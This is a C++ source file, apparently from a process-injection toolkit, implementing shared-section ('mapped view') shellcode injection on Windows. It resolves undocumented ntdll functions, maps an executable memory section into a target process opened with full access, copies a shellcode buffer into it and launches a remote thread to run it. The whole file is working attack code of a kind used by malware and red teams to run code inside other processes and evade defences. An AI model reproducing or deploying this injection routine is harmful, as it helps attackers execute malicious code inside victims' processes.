#include "inject.h"

auto memory_view(DWORD const pid) -> bool
{
  auto NtCreateSection = (_NtCreateSection)::ul::get_module_export("ntdll.dll", "NtCreateSection");
  auto NtMapViewOfSection = (_NtMapViewOfSection)::ul::get_module_export("ntdll.dll", "NtMapViewOfSection");
  auto RtlCreateUserThread = (_RtlCreateUserThread)::ul::get_module_export("ntdll.dll", "RtlCreateUserThread");
  if (NtCreateSection == nullptr || NtMapViewOfSection == nullptr || RtlCreateUserThread == nullptr) {
    ::ul::error("Cannot get required ntdll exports");
    return false;
  }

  SIZE_T size = 4096;
  LARGE_INTEGER sectionSize = {(DWORD)size};
  HANDLE hSection = NULL;
  PVOID local_section = NULL;
  PVOID remote_section = NULL;

  // Create a section object
  NtCreateSection(&hSection, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, (PLARGE_INTEGER)&sectionSize, PAGE_EXECUTE_READWRITE,
                  SEC_COMMIT, NULL);

  // Create a view of the memory section in the local process
  NtMapViewOfSection(hSection, GetCurrentProcess(), &local_section, NULL, NULL, NULL, &size, 2, NULL, PAGE_READWRITE);

  // Create a view of the memory section in the target process
  auto hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
  NtMapViewOfSection(hSection, hProcess, &remote_section, NULL, NULL, NULL, &size, 2, NULL, PAGE_EXECUTE_READ);

  // Copy shellcode to the local view, which will get reflected in the target process's mapped view
  memcpy(local_section, g_shellcode, sizeof(g_shellcode));

  HANDLE hThread = NULL;
  RtlCreateUserThread(hProcess, NULL, FALSE, 0, 0, 0, remote_section, NULL, &hThread, NULL);  // CreateRemoteThread

  return true;
}